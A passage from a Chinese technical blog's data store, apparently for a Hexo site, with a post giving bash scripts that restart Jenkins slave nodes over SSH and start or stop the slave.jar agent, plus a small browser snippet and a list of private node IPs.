title=\"任务运行涉及到的slave服务器\"></a>任务运行涉及到的slave服务器</h3><p>重启过程导致slave服务器连接master失败，可以考虑重启一下jenkins slave服务。</p>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><ol>\n<li><a href=\"http://stackoverflow.com/questions/15112890/jenkins-not-executing-jobs-pending-waiting-for-next-executor\">http://stackoverflow.com/questions/15112890/jenkins-not-executing-jobs-pending-waiting-for-next-executor</a></li>\n<li><a href=\"http://blog.csdn.net/jinhuiyu/article/details/4827051\">http://blog.csdn.net/jinhuiyu/article/details/4827051</a></li>\n</ol>\n"},{"title":"jenkins节点重启脚本","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" />\n\n\n## 远程重启jenkins节点脚本\n``` bash\nNODE_CONFIG=nodes.ini\nJENKINS_CLIENT_COMMAND=/opt/work/local/jenkins/jenkins-client/bin/client.sh\n\n\nstart_nodes() {\n        while read node\n        do\n                if [ -z \"$node\" ]; then\n                        continue;\n                fi\n\n                echo \"current node: $node\";\n                start_remote_jenkins $node;\n        done < $NODE_CONFIG\n}\n\nstart_remote_jenkins() {\n        remote_ip=$1\n        ssh $remote_ip 2>&1 << remote_command\n        sh $JENKINS_CLIENT_COMMAND;\n        exit;\nremote_command\n}\n\n\nstart_nodes\n```\n\n<!-- more -->\n\n## jenkins slave脚本\njenkins slave重启脚本\n\n``` bash\n\n\nfunction file_source() {\n  if [ -f $1 ]; then\n    source $1;\n  fi\n}\n\n\nfile_source /etc/profile\nfile_source ~/.profile\nfile_source ~/bash_profile\n\n\nif test -z \"${JAVA_HOME}\"; then\n  echo \"please config JAVA_HOME~\"\n  exit 1;\nfi\n\n\nBIN_PARAM='start'\nif [ $# -ge 1 ]; then\n  BIN_PARAM=$1\nfi\n\n\nJAVA_EXE=$JAVA_HOME/bin/java\n\nBIN_PATH=$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )\nSLAVE_CONFIG=$BIN_PATH/slave.conf\nsource $SLAVE_CONFIG \n\nSLAVE_HOME=$(dirname $BIN_PATH)\nLOG_FILE=$SLAVE_HOME/logs/jenkins_slave.log\n\nSLAVE_PID_COMMAND=\"ps -ef | grep $SECRET_ID | grep -v grep | awk '{print \\$2}'\"\nSLAVE_PID=$(eval $SLAVE_PID_COMMAND)\n\nSTART_COMMAND=\"nohup $JAVA_EXE -jar ${BIN_PATH}/slave.jar -jnlpUrl http://${SERVER_HOST}:${SERVER_PORT}/computer/${SLAVE_NAME}/slave-agent.jnlp -secret $SECRET_ID 1>>$LOG_FILE 2>&1 &\"\n\n\necho \"========================================\"\necho \"java bin path: $JAVA_EXE\"\necho \"slave client home path: $SLAVE_HOME\"\necho \"slave client bin path: $BIN_PATH\"\necho \"load slave client conf: $SLAVE_CONFIG\"\necho \"========================================\"\necho \"jenkins connection params:\"\necho \"  - server host: $SERVER_HOST\"\necho \"  - server port: $SERVER_PORT\"\necho \"  - slave name: $SLAVE_NAME\"\necho \"  - secret id: $SECRET_ID\"\necho \"========================================\"\n\n\n\nfunction startup() {\n  echo \"execute get process command: $SLAVE_PID_COMMAND\"\n  if [ -n \"$SLAVE_PID\" ]; then\n    echo \"process with $SECRET_ID has existed.\"\n    echo \"jenkins slave client pid: $SLAVE_PID\"\n    exit 0;\n  fi\n\n  echo \"execute script shell: $START_COMMAND\"\n  eval $START_COMMAND\n  \n  if [ $? -ne 0 ]; then\n    echo \"fail to startup the jenkins slave client.\"\n    exit 1;\n  fi\n\n  SLAVE_PID=$(eval $SLAVE_PID_COMMAND)\n  echo \"the jenkins slave client process id: $SLAVE_PID\"\n  return;\n}\n\n\nfunction shutdown() {\n  echo \"execute get process command: $SLAVE_PID_COMMAND\"\n  if [ -z \"$SLAVE_PID\" ]; then\n    echo \"no process with $SECRET_ID\"\n    exit 0;\n  fi\n  \n  echo \"killing process with pid: $SLAVE_PID\"\n  kill -9 $SLAVE_PID\n\n  if [ $? -ne 0 ]; then\n    echo \"fail to shutdown the jenkins slave client with pid: $SLAVE_PID\"\n    exit 1;\n  fi\n\n  echo \"the jenkins slave client has stoped.\"\n  return;\n}\n\n\nfunction bootstrap() {\n  if [ $BIN_PARAM == \"start\" ] || [ $BIN_PARAM == \"startup\" ]; then\n    echo \"startup jenkins slave client...\"\n    startup\n    exit 0;\n  elif [ $BIN_PARAM == \"stop\" ] || [ $BIN_PARAM == \"shutdown\" ]; then\n    echo \"shutdown jenkins slave client...\"\n    shutdown\n    exit 0;\n  else\n    echo \"not support param: $1\"\n    exit 1;\n  fi\n}\n\n\nbootstrap\n\n```\n\n\n## node节点\n``` javascript\nvar links = document.getElementsByClassName(\"model-link\");\nfor (var i=0;i<links.length;i++)\n{\n\tconsole.log(links[i].innerText);\n}\n```\n\n``` ini\n10.10.1.11\n10.10.1.12\n10.10.1.13\n10.13.2.14\n10.13.2.15\n10.13.2.16\n```","source":"_posts/article/jenkins/jenkins节点重启脚本.md","raw":"categories:\n  - 持续集成\ntags:\n  - jenkins\ntitle: jenkins节点重启脚本\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" />\n\n\n## 远程重启jenkins节点脚本\n``` bash\nNODE_CONFIG=nodes.ini\nJENKINS_CLIENT_COMMAND=/opt/work/local/jenkins/jenkins-client/bin/client.sh\n\n\nstart_nodes() {\n        while read node\n        do\n                if [ -z \"$node\" ]; then\n                        continue;\n                fi\n\n                echo \"current node: $node\";\n                start_remote_jenkins $node;\n        done < $NODE_CONFIG\n}\n\nstart_remote_jenkins() {\n        remote_ip=$1\n        ssh $remote_ip 2>&1 << remote_command\n        sh $JENKINS_CLIENT_COMMAND;\n        exit;\nremote_command\n}\n\n\nstart_nodes\n```\n\n<!-- more -->\n\n## jenkins slave脚本\njenkins slave重启脚本\n\n``` bash\n\n\nfunction file_source() {\n  if [ -f $1 ]; then\n    source $1;\n  fi\n}\n\n\nfile_source /etc/profile\nfile_source ~/.profile\nfile_source ~/bash_profile\n\n\nif test -z \"${JAVA_HOME}\"; then\n  echo \"please config JAVA_HOME~\"\n  exit 1;\nfi\n\n\nBIN_PARAM='start'\nif [ $# -ge 1 ]; then\n  BIN_PARAM=$1\nfi\n\n\nJAVA_EXE=$JAVA_HOME/bin/java\n\nBIN_PATH=$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )\nSLAVE_CONFIG=$BIN_PATH/slave.conf\nsource $SLAVE_CONFIG \n\nSLAVE_HOME=$(dirname $BIN_PATH)\nLOG_FILE=$SLAVE_HOME/logs/jenkins_slave.log\n\nSLAVE_PID_COMMAND=\"ps -ef | grep $SECRET_ID | grep -v grep | awk '{print \\$2}'\"\nSLAVE_PID=$(eval $SLAVE_PID_COMMAND)\n\nSTART_COMMAND=\"nohup $JAVA_EXE -jar ${BIN_PATH}/slave.jar -jnlpUrl http://${SERVER_HOST}:${SERVER_PORT}/computer/${SLAVE_NAME}/slave-agent.jnlp -secret $SECRET_ID 1>>$LOG_FILE 2>&1 &\"\n\n\necho \"========================================\"\necho \"java bin path: $JAVA_EXE\"\necho \"slave client home path: $SLAVE_HOME\"\necho \"slave client bin path: $BIN_PATH\"\necho \"load slave client conf: $SLAVE_CONFIG\"\necho \"========================================\"\necho \"jenkins connection params:\"\necho \"  - server host: $SERVER_HOST\"\necho \"  - server port: $SERVER_PORT\"\necho \"  - slave name: $SLAVE_NAME\"\necho \"  - secret id: $SECRET_ID\"\necho \"========================================\"\n\n\n\nfunction startup() {\n  echo \"execute get process command: $SLAVE_PID_COMMAND\"\n  if [ -n \"$SLAVE_PID\" ]; then\n    echo \"process with $SECRET_ID has existed.\"\n    echo \"jenkins slave client pid: $SLAVE_PID\"\n    exit 0;\n  fi\n\n  echo \"execute script shell: $START_COMMAND\"\n  eval $START_COMMAND\n  \n  if [ $? -ne 0 ]; then\n    echo \"fail to startup the jenkins slave client.\"\n    exit 1;\n  fi\n\n  SLAVE_PID=$(eval $SLAVE_PID_COMMAND)\n  echo \"the jenkins slave client process id: $SLAVE_PID\"\n  return;\n}\n\n\nfunction shutdown() {\n  echo \"execute get process command: $SLAVE_PID_COMMAND\"\n  if [ -z \"$SLAVE_PID\" ]; then\n    echo \"no process with $SECRET_ID\"\n    exit 0;\n  fi\n  \n  echo \"killing process with pid: $SLAVE_PID\"\n  kill -9 $SLAVE_PID\n\n  if [ $? -ne 0 ]; then\n    echo \"fail to shutdown the jenkins slave client with pid: $SLAVE_PID\"\n    exit 1;\n  fi\n\n  echo \"the jenkins slave client has stoped.\"\n  return;\n}\n\n\nfunction bootstrap() {\n  if [ $BIN_PARAM == \"start\" ] || [ $BIN_PARAM == \"startup\" ]; then\n    echo \"startup jenkins slave client...\"\n    startup\n    exit 0;\n  elif [ $BIN_PARAM == \"stop\" ] || [ $BIN_PARAM == \"shutdown\" ]; then\n    echo \"shutdown jenkins slave client...\"\n    shutdown\n    exit 0;\n  else\n    echo \"not support param: $1\"\n    exit 1;\n  fi\n}\n\n\nbootstrap\n\n```\n\n\n## node节点\n``` javascript\nvar links = document.getElementsByClassName(\"model-link\");\nfor (var i=0;i<links.length;i++)\n{\n\tconsole.log(links[i].innerText);\n}\n```\n\n``` ini\n10.10.1.11\n10.10.1.12\n10.10.1.13\n10.13.2.14\n10.13.2.15\n10.13.2.16\n```","slug":"article/jenkins/jenkins节点重启脚本","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxsf003r5nbtxy0rsm4e","content":"<p><img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"远程重启jenkins节点脚本\"><a href=\"#远程重启jenkins节点脚本\" class=\"headerlink\" title=\"远程重启jenkins节点脚本\"></a>远程重启jenkins节点脚本</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\">NODE_CONFIG=nodes.ini</div><div class=\"line\">JENKINS_CLIENT_COMMAND=/opt/work/<span class=\"built_in\">local</span>/jenkins/jenkins-client/bin/client.sh</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"title\">start_nodes</span></span>() &#123;</div><div class=\"line\">        <span class=\"keyword\">while</span> <span class=\"built_in\">read</span> node</div><div class=\"line\">        <span class=\"keyword\">do</span></div><div class=\"line\">                <span class=\"keyword\">if</span> [ -z <span class=\"string\">\"<span class=\"variable\">$node</span>\"</span> ]; <span class=\"keyword\">then</span></div><div class=\"line\">                        <span class=\"built_in\">continue</span>;</div><div class=\"line\">                <span class=\"keyword\">fi</span></div><div class=\"line\"></div><div class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"string\">\"current node: <span class=\"variable\">$node</span>\"</span>;</div><div class=\"line\">                start_remote_jenkins <span class=\"variable\">$node</span>;</div><div class=\"line\">        <span class=\"keyword\">done</span> &lt; <span class=\"variable\">$NODE_CONFIG</span></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"title\">start_remote_jenkins</span></span>() &#123;</div><div class=\"line\">        remote_ip=<span class=\"variable\">$1</span></div><div class=\"line\">        ssh <span class=\"variable\">$remote_ip</span> 2&gt;&amp;1 &lt;&lt; remote_<span class=\"built_in\">command</span></div><div class=\"line\">        sh <span class=\"variable\">$JENKINS_CLIENT_COMMAND</span>;</div><div class=\"line\">        <span class=\"built_in\">exit</span>;</div><div class=\"line\">remote_<span class=\"built_in\">command</span></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">start_nodes</div></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"jenkins-slave脚本\"><a href=\"#jenkins-slave脚本\" class=\"headerlink\" title=\"jenkins slave脚本\"></a>jenkins slave脚本</h2><p>jenkins slave重启脚本</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">file_source</span></span>() &#123;</div><div class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"_\">-f</span> <span class=\"variable\">$1</span> ]; <span class=\"keyword\">then</span></div><div class=\"line\">    <span class=\"built_in\">source</span> <span class=\"variable\">$1</span>;</div><div class=\"line\">  <span class=\"keyword\">fi</span></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">file_<span class=\"built_in\">source</span> /etc/profile</div><div class=\"line\">file_<span class=\"built_in\">source</span> ~/.profile</div><div class=\"line\">file_<span class=\"built_in\">source</span> ~/bash_profile</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">test</span> -z <span class=\"string\">\"<span class=\"variable\">$&#123;JAVA_HOME&#125;</span>\"</span>; <span class=\"keyword\">then</span></div><div class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"please config JAVA_HOME~\"</span></div><div class=\"line\">  <span class=\"built_in\">exit</span> 1;</div><div class=\"line\"><span class=\"keyword\">fi</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">BIN_PARAM=<span class=\"string\">'start'</span></div><div class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"variable\">$#</span> -ge 1 ]; <span class=\"keyword\">then</span></div><div class=\"line\">  BIN_PARAM=<span class=\"variable\">$1</span></div><div class=\"line\"><span class=\"keyword\">fi</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">JAVA_EXE=<span class=\"variable\">$JAVA_HOME</span>/bin/java</div><div class=\"line\"></div><div class=\"line\">BIN_PATH=$( <span class=\"built_in\">cd</span> <span class=\"string\">\"<span class=\"variable\">$( dirname \"$&#123;BASH_SOURCE[0]&#125;\" )</span>\"</span> &amp;&amp; <span class=\"built_in\">pwd</span> )</div><div class=\"line\">SLAVE_CONFIG=<span class=\"variable\">$BIN_PATH</span>/slave.conf</div><div class=\"line\"><span class=\"built_in\">source</span> <span class=\"variable\">$SLAVE_CONFIG</span> </div><div class=\"line\"></div><div class=\"line\">SLAVE_HOME=$(dirname <span class=\"variable\">$BIN_PATH</span>)</div><div class=\"line\">LOG_FILE=<span class=\"variable\">$SLAVE_HOME</span>/logs/jenkins_slave.log</div><div class=\"line\"></div><div class=\"line\">SLAVE_PID_COMMAND=<span class=\"string\">\"ps -ef | grep <span class=\"variable\">$SECRET_ID</span> | grep -v grep | awk '&#123;print \\$2&#125;'\"</span></div><div class=\"line\">SLAVE_PID=$(<span class=\"built_in\">eval</span> <span class=\"variable\">$SLAVE_PID_COMMAND</span>)</div><div class=\"line\"></div><div class=\"line\">START_COMMAND=<span class=\"string\">\"nohup <span class=\"variable\">$JAVA_EXE</span> -jar <span class=\"variable\">$&#123;BIN_PATH&#125;</span>/slave.jar -jnlpUrl http://<span class=\"variable\">$&#123;SERVER_HOST&#125;</span>:<span class=\"variable\">$&#123;SERVER_PORT&#125;</span>/computer/<span class=\"variable\">$&#123;SLAVE_NAME&#125;</span>/slave-agent.jnlp -secret <span class=\"variable\">$SECRET_ID</span> 1&gt;&gt;<span class=\"variable\">$LOG_FILE</span> 2&gt;&amp;1 &amp;\"</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"========================================\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"java bin path: <span class=\"variable\">$JAVA_EXE</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"slave client home path: <span class=\"variable\">$SLAVE_HOME</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"slave client bin path: <span class=\"variable\">$BIN_PATH</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"load slave client conf: <span class=\"variable\">$SLAVE_CONFIG</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"========================================\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"jenkins connection params:\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"  - server host: <span class=\"variable\">$SERVER_HOST</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"  - server port: <span class=\"variable\">$SERVER_PORT</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"  - slave name: <span class=\"variable\">$SLAVE_NAME</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"  - secret id: <span class=\"variable\">$SECRET_ID</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"========================================\"</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">startup</span></span>() &#123;</div><div class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"execute get process command: <span class=\"variable\">$SLAVE_PID_COMMAND</span>\"</span></div><div class=\"line\">  <span class=\"keyword\">if</span> [ -n <span class=\"string\">\"<span class=\"variable\">$SLAVE_PID</span>\"</span> ]; <span class=\"keyword\">then</span></div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"process with <span class=\"variable\">$SECRET_ID</span> has existed.\"</span></div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"jenkins slave client pid: <span class=\"variable\">$SLAVE_PID</span>\"</span></div><div class=\"line\">    <span class=\"built_in\">exit</span> 0;</div><div class=\"line\">  <span class=\"keyword\">fi</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"execute script shell: <span class=\"variable\">$START_COMMAND</span>\"</span></div><div class=\"line\">  <span class=\"built_in\">eval</span> <span class=\"variable\">$START_COMMAND</span></div><div class=\"line\">  </div><div class=\"line\">  <span class=\"keyword\">if</span> [ $? <span class=\"_\">-ne</span> 0 ]; <span class=\"keyword\">then</span></div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"fail to startup the jenkins slave client.\"</span></div><div class=\"line\">    <span class=\"built_in\">exit</span> 1;</div><div class=\"line\">  <span class=\"keyword\">fi</span></div><div class=\"line\"></div><div class=\"line\">  SLAVE_PID=$(<span class=\"built_in\">eval</span> <span class=\"variable\">$SLAVE_PID_COMMAND</span>)</div><div class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"the jenkins slave client process id: <span class=\"variable\">$SLAVE_PID</span>\"</span></div><div class=\"line\">  <span class=\"built_in\">return</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">shutdown</span></span>() &#123;</div><div class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"execute get process command: <span class=\"variable\">$SLAVE_PID_COMMAND</span>\"</span></div><div class=\"line\">  <span class=\"keyword\">if</span> [ -z <span class=\"string\">\"<span class=\"variable\">$SLAVE_PID</span>\"</span> ]; <span class=\"keyword\">then</span></div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"no process with <span class=\"variable\">$SECRET_ID</span>\"</span></div><div class=\"line\">    <span class=\"built_in\">exit</span> 0;</div><div class=\"line\">  <span class=\"keyword\">fi</span></div><div class=\"line\">  </div><div class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"killing process with pid: <span class=\"variable\">$SLAVE_PID</span>\"</span></div><div class=\"line\">  <span class=\"built_in\">kill</span> -9 <span class=\"variable\">$SLAVE_PID</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">if</span> [ $? <span class=\"_\">-ne</span> 0 ]; <span class=\"keyword\">then</span></div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"fail to shutdown the jenkins slave client with pid: <span class=\"variable\">$SLAVE_PID</span>\"</span></div><div class=\"line\">    <span class=\"built_in\">exit</span> 1;</div><div class=\"line\">  <span class=\"keyword\">fi</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"the jenkins slave client has stoped.\"</span></div><div class=\"line\">  <span class=\"built_in\">return</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">bootstrap</span></span>() &#123;</div><div class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$BIN_PARAM</span> == <span class=\"string\">\"start\"</span> ] || [ <span class=\"variable\">$BIN_PARAM</span> == <span class=\"string\">\"startup\"</span> ]; <span class=\"keyword\">then</span></div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"startup jenkins slave client...\"</span></div><div class=\"line\">    startup</div><div class=\"line\">    <span class=\"built_in\">exit</span> 0;</div><div class=\"line\">  <span class=\"keyword\">elif</span> [ <span class=\"variable\">$BIN_PARAM</span> == <span class=\"string\">\"stop\"</span> ] || [ <span class=\"variable\">$BIN_PARAM</span> == <span class=\"string\">\"shutdown\"</span> ]; <span class=\"keyword\">then</span></div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"shutdown jenkins slave client...\"</span></div><div class=\"line\">    shutdown</div><div class=\"line\">    <span class=\"built_in\">exit</span> 0;</div><div class=\"line\">  <span class=\"keyword\">else</span></div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"not support param: <span class=\"variable\">$1</span>\"</span></div><div class=\"line\">    <span class=\"built_in\">exit</span> 1;</div><div class=\"line\">  <span class=\"keyword\">fi</span></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">bootstrap</div></pre></td></tr></table></figure>\n<h2 id=\"node节点\"><a href=\"#node节点\" class=\"headerlink\" title=\"node节点\"></a>node节点</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> links = <span class=\"built_in\">document</span>.getElementsByClassName(<span class=\"string\">\"model-link\"</span>);</div><div class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">0</span>;i&lt;links.length;i++)</div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">console</span>.log(links[i].innerText);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">10.10.1.11</div><div class=\"line\">10.10.1.12</div><div class=\"line\">10.10.1.13</div><div class=\"line\">10.13.2.14</div><div class=\"line\">10.13.2.15</div><div class=\"line\">10.13.2.16</div></pre></td></tr></table></figure>","excerpt":"<p><img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"远程重启jenkins节点脚本\"><a href=\"#远程重启jenkins节点脚本\" class=\"headerlink\" title=\"远程重启jenkins节点脚本\"></a>远程重启jenkins节点脚本</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\">NODE_CONFIG=nodes.ini</div><div class=\"line\">JENKINS_CLIENT_COMMAND=/opt/work/<span class=\"built_in\">local</span>/jenkins/jenkins-client/bin/client.sh</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"title\">start_nodes</span></span>() &#123;</div><div class=\"line\">        <span class=\"keyword\">while</span> <span class=\"built_in\">read</span> node</div><div class=\"line\">        <span class=\"keyword\">do</span></div><div class=\"line\">                <span class=\"keyword\">if</span> [ -z <span class=\"string\">\"<span class=\"variable\">$node</span>\"</span> ]; <span class=\"keyword\">then</span></div><div class=\"line\">                        <span class=\"built_in\">continue</span>;</div><div class=\"line\">                <span class=\"keyword\">fi</span></div><div class=\"line\"></div><div class=\"line\">                <span class=\"built_in\">echo</span> <span class=\"string\">\"current node: <span class=\"variable\">$node</span>\"</span>;</div><div class=\"line\">                start_remote_jenkins <span class=\"variable\">$node</span>;</div><div class=\"line\">        <span class=\"keyword\">done</span> &lt; <span class=\"variable\">$NODE_CONFIG</span></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"title\">start_remote_jenkins</span></span>() &#123;</div><div class=\"line\">        remote_ip=<span class=\"variable\">$1</span></div><div class=\"line\">        ssh <span class=\"variable\">$remote_ip</span> 2&gt;&amp;1 &lt;&lt; remote_<span class=\"built_in\">command</span></div><div class=\"line\">        sh <span class=\"variable\">$JENKINS_CLIENT_COMMAND</span>;</div><div class=\"line\">        <span class=\"built_in\">exit</span>;</div><div class=\"line\">remote_<span class=\"built_in\">command</span></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">start_nodes</div></pre></td></tr></table></figure>","more":"<h2 id=\"jenkins-slave脚本\"><a href=\"#jenkins-slave脚本\" class=\"headerlink\" title=\"jenkins slave脚本\"></a>jenkins slave脚本</h2><p>jenkins slave重启脚本</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div 